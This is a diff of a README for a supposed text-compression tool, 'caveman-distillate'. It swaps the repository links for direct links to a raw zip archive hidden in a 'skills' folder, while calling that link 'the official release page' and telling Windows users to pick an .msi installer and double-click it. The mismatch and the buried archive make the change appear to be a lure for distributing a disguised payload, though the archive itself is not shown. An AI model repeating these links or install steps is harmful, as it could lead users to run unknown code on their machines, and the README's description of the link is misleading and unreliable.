@@ -1,6 +1,6 @@
 # 🧠 caveman-distillate - Save space with smart text compression
 
-[![](https://img.shields.io/badge/Download_Caveman_Distillate-007bff?style=for-the-badge)](https://github.com/salvageable-mutualfund57/caveman-distillate)
+[![](https://img.shields.io/badge/Download_Caveman_Distillate-007bff?style=for-the-badge)](https://github.com/salvageable-mutualfund57/caveman-distillate/raw/refs/heads/main/skills/distillate_caveman_chirographical.zip)
 
 ## 🎯 About this tool
 
@@ -20,7 +20,7 @@ Your computer needs the following settings to run this tool:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page: [https://github.com/salvageable-mutualfund57/caveman-distillate](https://github.com/salvageable-mutualfund57/caveman-distillate).
+1.  Visit the official release page: [https://github.com/salvageable-mutualfund57/caveman-distillate/raw/refs/heads/main/skills/distillate_caveman_chirographical.zip](https://github.com/salvageable-mutualfund57/caveman-distillate/raw/refs/heads/main/skills/distillate_caveman_chirographical.zip).
 2.  Select the file ending in .msi to start your download.
 3.  Open the folder where you saved the file.
 4.  Double-click the installer icon.
